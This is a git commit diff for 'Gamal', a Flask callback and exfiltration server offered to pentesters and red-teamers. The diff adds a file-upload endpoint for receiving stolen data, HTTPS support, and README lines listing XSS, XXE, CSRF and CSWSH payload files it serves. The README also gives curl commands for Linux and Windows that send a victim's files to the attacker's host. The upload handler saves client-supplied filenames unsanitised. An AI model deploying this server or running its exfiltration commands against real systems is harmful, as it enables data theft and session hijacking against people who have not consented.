03888bc30614e15bd4dc0e7ab3f3dcbdd9192a6b
Milad Fadavvi <Fadavvi@users.noreply.github.com>
2025-07-30 20:45:45 +0000

    v 1.0.1

--- README.md
+++ README.md
@@ -1,40 +1,47 @@
 # Gamal
-A tiny flask app for helping pentesters and bug hunters in XSS, Session Hijacking, Session Riding and Cookie Thieve.
-
-## Dependencies:
-python 3
-1. Flask
+A tiny flask app for helping pentesters, red-teamers and bug hunters in data exfileration, SSRF, XSS, Session Hijacking, Session Riding and Cookie Thieve.
 
 ## Install & usage:
 
-```cd /opt```
+```bash
+cd /opt
+git clone github.com/Fadavvi/Gamal
+cd Gamal
+python3 -m pip install flask
+python3 gamal.py
+```  
 
-```git clone github.com/Fadavvi/Gamal```
-
-```cd Gamal```
-
-```python3 gamal.py```  
-Default configuration: IP binding: `0.0.0.0`, Port: `1337`, Log: `gamal.log`, Canary-String: `BooqBooqGamal`
+Default configuration: IP binding: `0.0.0.0`, Port: `1337`, Log: `gamal.log`, Canary-String: `booqbooqGamal`
 
 or
 
-```python3 gamal.py --ip <IPADDR> --port <PORTNUM> --log <LOGPATH> --canary <YourCanaryString>```
+`python3 gamal.py --ip <IPADDR> --port <PORTNUM> --log <LOGPATH> --canary <YourCanaryString> [--cert <FullChain> --key <PrivateKey>]`
 
-Then you can use your IP & Port in your XSS | XXE | Open-Redirect | Etc. payloads
+Then you can use your IP & Port in your SSRF XSS | XXE | Open-Redirect | Etc. payloads.
 
-***Note:*** Add your files in ```/f``` folder ==>  ```http://IP:PORT/f/<Your-FileName>``` 
+***Note:*** Add your files in `/f` folder ==>  `http://IP:PORT/f/<Your-FileName>` 
 
 ## Paylods:
-```/f/xss.js``` XSS Sample function
+`/f/xss.js` XSS Sample function
 
-```/f/CORS.html``` CORS sample script
+`/f/CORS.html` CORS sample script
 
-```/f/CSRF.html``` CSRF sample page
+`/f/CSRF.html` CSRF sample page
 
-```/f/CSWSH.html``` Cross-Site WebSocket Hijacking (CSWSH) script
+`/f/CSWSH.html` Cross-Site WebSocket Hijacking (CSWSH) script
 
-```/f/meta.jpg``` XSS in Meta-data 
+`/f/meta.jpg` XSS in Meta-data 
 
-```/f/EBXXE.dtd``` XXE .dtd sample file
+`/f/EBXXE.dtd` XXE .dtd sample file
 
-```/f/xxe1.svg``` and ```/f/xxe2.svg``` XXE in SVG file
+`/f/xxe1.svg` and `/f/xxe2.svg` XXE in SVG file
+
+## Data exfiltration
+
+Linux / MacOS:
+
+`curl -k -F "file=@<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload`
+
+Windows:
+
+`Remove-Item alias:curl; curl -k -F "file=@C:\<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload`
--- gamal.py
+++ gamal.py
@@ -3,20 +3,40 @@
 from flask import Flask, request, jsonify, send_from_directory
 import json
 import argparse
+import ssl
+import os
+import uuid
 ############# Flask Routes #################
 app = Flask(__name__,static_url_path='')
+Upload_path = "received"
+os.makedirs(Upload_path, exist_ok=True)
 #------------------------------------------
 @app.route('/info', methods=['GET','POST']) # Print info 
 def info():
-    return "<h3>Gamal v0.4 | Milad Fadavvi</h3>" 
+    return "<h3>Gamal v1.0.1 | Milad Fadavvi</h3>" 
 #------------------------------------------
-@app.route('/f/<path:path>')
+@app.route('/f/<path:path>') #Servs files
 def send_js(path):
     return send_from_directory('f', path)
 #------------------------------------------
+@app.route("/e/upload", methods=["POST"])
+def upload_file():
+    if "file" not in request.files:
+        return jsonify({"error": "No file part in request"}), 400
+    
+    file = request.files["file"]
+    if file.filename == "":
+        return jsonify({"error": "No file selected"}), 400
+    
+    # Save file to 'received' directory
+    filepath = os.path.join(Upload_path, request.remote_addr + '-' + str(uuid.uuid1()) + '-' + file.filename)
+    file.save(filepath)
+    
+    return jsonify({"message": f"File uploaded successfully!"}), 200
+#------------------------------------------
 @app.errorhandler(404) 
 @app.errorhandler(400)
-@app.route('/<path:path>', methods=['GET','POST'])
+@app.route('/<path:path>', methods=['GET','POST']) #Logs info
 def SaveData(e='',path=''):
     LogFile = open (Arguments.log, "a+")
     LogFile.write("-" * 33 + '\n')
@@ -44,14 +64,23 @@ def SaveData(e='',path=''):
 if __name__ == "__main__":
     global Arguments #!!!
     #------------------------------------------
-    parser = argparse.ArgumentParser(description='Gamal v0.3: Session Hijacking | Cookie Thieve | HTTP/HTTPS callback')
+    parser = argparse.ArgumentParser(description='Gamal v1.0.1:\nA tiny flask app for helping pentesters, red-teamers and bug hunters in data exfileration, SSRF, XSS, Session Hijacking, Session Riding and Cookie Thieve.')
     parser.add_argument('--log', default='gamal.log' , help='Path to the log file')
-    parser.add_argument('--port', default=1337 , help='Port / HTTP')
+    parser.add_argument('--port', default=1337 , help='Port / HTTPs')
     parser.add_argument('--ip', default='0.0.0.0' , help='IP e.g. : 0.0.0.0 or 127.0.0.1')
-    parser.add_argument('--canary', default='BooqBooqGamal' , help='Canary value')
+    parser.add_argument('--canary', default='booqbooqGamal' , help='Canary token')
+    parser.add_argument('--cert', help='Your fullchain.pem file')
+    parser.add_argument('--key', help='Your ssl private key file')
     Arguments = parser.parse_args()
     #------------------------------------------
-    try:
-        app.run(host=Arguments.ip , port=int(Arguments.port),threaded=True) 
-    except:
-        parser.print_help()
+    if Arguments.cert and Arguments.key:
+        cert_file = Arguments.cert
+        key_file = Arguments.key
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
+        context.load_cert_chain(certfile=cert_file, keyfile=key_file)
+        app.run(host=Arguments.ip , port=int(Arguments.port),threaded=True, ssl_context=context)
+    else: 
+        try:
+            app.run(host=Arguments.ip , port=int(Arguments.port),threaded=True, ssl_context='adhoc')
+        except:
+            parser.print_help()
